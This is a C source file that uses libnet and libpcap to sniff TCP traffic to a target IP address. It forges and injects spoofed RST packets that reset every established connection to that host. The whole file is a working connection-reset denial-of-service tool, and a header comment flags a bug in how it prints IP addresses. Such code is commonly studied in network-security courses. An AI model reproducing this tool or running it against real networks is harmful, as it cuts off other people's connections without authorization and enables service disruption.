/* ERRORS: IP addresses printing in wrong order (See $$ below) */

#define _DEFAULT_SOURCE
#include <libnet.h>
#include <pcap.h>
#include <sys/types.h>
#include <stdint.h>

void caught_packet( u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

/* This is used to pass data to the callback function */
struct data_pass {
    intptr_t libnet_handle;
    u_char *packet;
};

/* Main function to initailize libnet and libpcap and loop for packets */
int main(int argc, char *argv[]) {
    pcap_t *pcap_handle;
    libnet_t *context;
    const char *device; // Name of device used for packet injection
    u_long target_ip;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct data_pass my_data;

    // Verify arguments and print usage message
    if (argc < 2) {
        printf("Usage: %s <target IP>\n", argv[0]);
        exit(1);
    }

    // Open handle to session state for building a packet
    context = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (context == NULL) {
		printf("Error opening context: %s\n", errbuf);
		exit(1);
	}

    // Grab target IP from arguments
    target_ip = libnet_name2addr4(context, argv[1], LIBNET_RESOLVE);

    // Get the device we are using for libpcap
    if ((device = libnet_getdevice(context)) == NULL) {
        printf("Device is NULL, packet capture may be broken\n");
    }

    // Open a libpcap handle to the device
    pcap_handle = pcap_open_live(device, 128, 1, 1000, errbuf);
    if (pcap_handle == NULL) {
        printf("Error opening handle on device: %s\n", errbuf);
        exit(1);
    }

    // Initialize libnet packet
    my_data.libnet_handle = (intptr_t)context;
    my_data.packet = NULL;

    // Seed the random number generator for context
    libnet_seed_prand(context);

    // Call set_packet_filter function
    set_packet_filter(pcap_handle, (struct in_addr *) &target_ip);

    // Loop for packets
    printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
    pcap_loop(pcap_handle, -1, caught_packet, (u_char *) &my_data);

    pcap_close(pcap_handle);
}

/* Callback function for when we recieve packets from libpcap. This function spoofs the RST packet */
void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
    struct data_pass *data_passed;
    struct libnet_ipv4_hdr *IPHdr;
    struct libnet_tcp_hdr *TCPHdr;
    libnet_ptag_t tcp_tag, ip_tag = 0;
    libnet_t *context;
    int byte_count, packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;

    // Re-convert data passed into a data_pass struct
    data_passed = (struct data_pass *) user_args;

    // Cast to libnet_t
    context = (libnet_t *) (data_passed->libnet_handle);

    // Add offsets to get to respective headers
    IPHdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
    TCPHdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_IPV4_H);

    /* $$$$$$ This is printing IP addresses in the wrong order $$$$$$$ */
    printf("Resetting TCP connection from %s:%d", inet_ntoa(IPHdr->ip_src), ntohs(TCPHdr->th_sport));
    printf(" <---> %s:%d\n", inet_ntoa(IPHdr->ip_dst), ntohs(TCPHdr->th_dport));

    // Build TCP header
    tcp_tag = libnet_build_tcp(htons(TCPHdr->th_dport), // Source TCP port (pretend we are the dst)
        htons(TCPHdr->th_sport),                    // Destination port (send back to src)
        htonl(TCPHdr->th_ack),                      // Sequence number
        libnet_get_prand(LIBNET_PRu32),             // Ack number
        TH_RST,                                     // Control flags
        libnet_get_prand(LIBNET_PRu16),             // Window size
        0,                                          // Checksum (0 to autofill)
        0,                                          // Urgent pointer
        LIBNET_TCP_H,                               // Total length of the TCP packet
        NULL,                                       // Payload
        0,                                          // Length of payload
        context,                                    // Pointer to libnet_t context
        0                                     // Build a new header
    );

    if (tcp_tag == -1) {
        printf("There was an error creating the tcp header: %s\n", libnet_geterror(context));
        exit(1);
    }

    // Build IP header
    ip_tag = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H, // Size of the packet
        0,                 // Type of service bits
        libnet_get_prand(LIBNET_PRu16), // IP identification number
        0,                              // Fragmenation bits and offset
        libnet_get_prand(LIBNET_PR8),   // TTL (time to live)
        IPPROTO_TCP,                    // Transport protcol
        0,                              // Checksum (0 means autofill)
        IPHdr->ip_dst.s_addr,           // Source IP address (pretend we are dst)
        IPHdr->ip_src.s_addr,           // Destination IP address (send back to source)
        NULL,                           // Payload or NULL
        0,                              // Payload length or 0
        context,                        // Pointer to libnet_t context
        0                          // Build new header
    );

    if (ip_tag == -1) {
        printf("There was an error creating the ip header: %s\n", libnet_geterror(context));
        exit(1);
    }

    // Write packet
    byte_count = libnet_write(context);

    if (byte_count == -1) {
        printf("ERROR: libnet_write() failed: %s\n", libnet_geterror(context));
        exit(1);
    }

    if (byte_count < packet_size) {
        printf("WARNING: Incomplete packet written: %d of %d written: %s\n", byte_count, packet_size, libnet_geterror(context));
        exit(1);
    }

    // Clear the packet so we can send multiple
    libnet_clear_packet(context);
}

/* Compile and set the BFP to only accept packets from established connections to the target IP */
int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip) {
    struct bpf_program filter;
    char filter_string[100];

    // Generate the filter string and store in char
    sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target_ip));

    // Compile the BPF
    if (pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1) {
        printf("pcap_compile failed\n");
        exit(1);
    }

    // Set the BPF
    if (pcap_setfilter(pcap_hdl, &filter) == -1) {
        printf("pcap_setfilter failed\n");
        exit(1);
    }
}